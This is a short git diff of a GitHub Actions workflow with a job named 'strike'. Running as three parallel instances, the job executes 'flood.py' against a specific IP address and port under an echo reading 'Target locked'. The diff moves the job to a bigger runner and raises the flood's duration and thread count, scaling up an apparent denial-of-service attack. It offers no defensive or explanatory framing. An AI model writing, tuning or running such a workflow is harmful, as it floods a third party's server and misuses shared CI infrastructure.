@@ -5,7 +5,7 @@ on:
 
 jobs:
   strike:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-latest-4-cores
     strategy:
       matrix:
         instance: [1, 2, 3]
@@ -19,4 +19,4 @@ jobs:
       - name: Execute Flood on Target
         run: |
           echo "[xTech] Target locked: 77.110.105.224:8303"
-          python flood.py -i 77.110.105.224 -p 8303 -t 120 -th 50
+          python flood.py -i 77.110.105.224 -p 8303 -t 300 -th 200
